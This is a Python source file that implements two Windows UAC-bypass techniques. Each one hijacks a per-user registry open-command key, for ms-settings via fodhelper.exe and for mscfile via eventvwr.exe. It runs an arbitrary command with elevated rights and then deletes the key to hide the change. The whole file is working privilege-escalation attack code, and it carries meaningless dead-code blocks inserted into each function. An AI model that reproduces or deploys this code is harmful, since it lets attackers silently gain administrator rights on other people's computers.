from _winreg import ConnectRegistry, OpenKey, CreateKey, SetValueEx, DeleteKey, CloseKey, HKEY_CURRENT_USER, KEY_SET_VALUE, KEY_WRITE, REG_SZ
import subprocess
import ctypes
import time
import os

def registry_hijacking_fodhelper(cmd, params=''):
    if False:
        for i in range(10):
            print('nop')
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    fodhelperPath = 'Software\\Classes\\ms-settings\\Shell\\Open\\command'
    if params:
        cmd = '%s %s'.strip() % (cmd, params)
    try:
        OpenKey(HKCU, fodhelperPath, KEY_SET_VALUE)
    except:
        CreateKey(HKCU, fodhelperPath)
    registry_key = OpenKey(HKCU, fodhelperPath, 0, KEY_WRITE)
    SetValueEx(registry_key, 'DelegateExecute', 0, REG_SZ, '')
    SetValueEx(registry_key, '', 0, REG_SZ, cmd)
    CloseKey(registry_key)
    triggerPath = os.path.join(os.environ['WINDIR'], 'System32', 'fodhelper.exe')
    wow64 = ctypes.c_long(0)
    ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(wow64))
    subprocess.check_output(triggerPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
    ctypes.windll.kernel32.Wow64EnableWow64FsRedirection(wow64)
    time.sleep(5)
    DeleteKey(HKCU, fodhelperPath)

def registry_hijacking_eventvwr(cmd, params=''):
    if False:
        while True:
            i = 10
    HKCU = ConnectRegistry(None, HKEY_CURRENT_USER)
    mscCmdPath = 'Software\\Classes\\mscfile\\shell\\open\\command'
    if params:
        cmd = '%s %s'.strip() % (cmd, params)
    try:
        registry_key = OpenKey(HKCU, mscCmdPath, KEY_SET_VALUE)
    except:
        registry_key = CreateKey(HKCU, mscCmdPath)
    SetValueEx(registry_key, '', 0, REG_SZ, cmd)
    CloseKey(registry_key)
    eventvwrPath = os.path.join(os.environ['WINDIR'], 'System32', 'eventvwr.exe')
    subprocess.check_output(eventvwrPath, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
    time.sleep(5)
    DeleteKey(HKCU, mscCmdPath)